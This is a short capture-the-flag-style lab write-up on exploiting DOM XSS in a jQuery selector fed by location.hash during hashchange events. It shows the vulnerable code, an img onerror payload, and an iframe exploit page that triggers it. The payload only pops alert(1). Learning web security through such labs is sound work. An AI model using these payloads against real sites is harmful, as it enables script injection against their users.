# DOM XSS in jQuery selector sink using a hashchange event — Apprentice

**Status:** Solved

---

## Goal

Exploit XSS in jQuery selector that processes URL hash values during hashchange events.

---

## Steps (simple & complete)

1. **Understand the vulnerability**
   - App uses jQuery to handle URL hash changes
   - Code looks like:
```javascript
   $(window).on('hashchange', function(){
       $(location.hash).hide();
   });
```

2. **Break the jQuery selector**
   - jQuery selector accepts HTML
   - We can inject img tag in hash:
```
   #<img src=x onerror=alert(1)>
```

3. **Craft exploit page**
   - Create iframe that triggers hashchange:
```html
   <iframe src="https://TARGET/#" onload="this.src+='<img src=x onerror=alert(1)>'">
```

4. **Execute attack**
   - Use exploit server or paste in browser
   - The iframe loads and changes hash
   - XSS triggers!

5. **Lab solved**
   - Alert appears from victim page

---

## Example

**Payload:**
```html
<iframe src="https://TARGET/#" onload="this.src+='<img src=x onerror=alert(1)>'"></iframe>
```

**What happens:**
1. Iframe loads with empty hash
2. onload changes src to include payload
3. Hash changes to `#<img src=x onerror=alert(1)>`
4. jQuery processes it → XSS! ✓

---

